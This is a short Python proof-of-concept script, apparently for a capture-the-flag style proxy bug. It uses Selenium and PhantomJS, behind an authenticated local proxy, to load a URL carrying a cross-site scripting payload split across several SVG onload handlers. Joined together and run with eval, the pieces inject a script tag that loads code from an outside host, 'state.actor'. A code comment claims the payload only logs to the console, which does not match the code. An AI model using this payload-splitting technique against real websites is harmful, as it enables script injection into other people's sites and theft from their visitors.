#!/usr/bin/env python3

from selenium import webdriver
from selenium.common.exceptions import TimeoutException, WebDriverException
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from base64 import b64encode

# Browse to URL to validate that UXSS proxy bug is working

# This payload will console.log("xss works")
url ="""
http://www.example.com/ooops/d35fs23hu73
ds/blocked.html?abcdeaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="s='a=document.createElement'">
</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="s+='(\\'script\\'); a.src=\\'';">
</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="s+='//state.actor/log.js\\'' ">
</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="s+='; document.body'">bbbbbbbb
</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="s+='.appendChild(a);'">bbbbbbb
</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="eval(s)" ></svg>
""".replace("\n","")


# Proxy config
service_args = [
    '--proxy=127.0.0.1:7239',
    '--proxy-type=http',
]
proxy_creds = b"OnlyOne:Overflow"
proxy_auth_token = "Basic " + b64encode(proxy_creds).decode("utf-8")
caps = DesiredCapabilities.PHANTOMJS
caps['phantomjs.page.customHeaders.Proxy-Authorization'] = proxy_auth_token

driver = webdriver.PhantomJS('/usr/bin/phantomjs', service_args=service_args,
                                desired_capabilities=caps)

driver.get(url)
driver.implicitly_wait(10)

print("\n<svg".join(driver.page_source.split("<svg")))
l = driver.get_log("har")

print("XSS" in l)
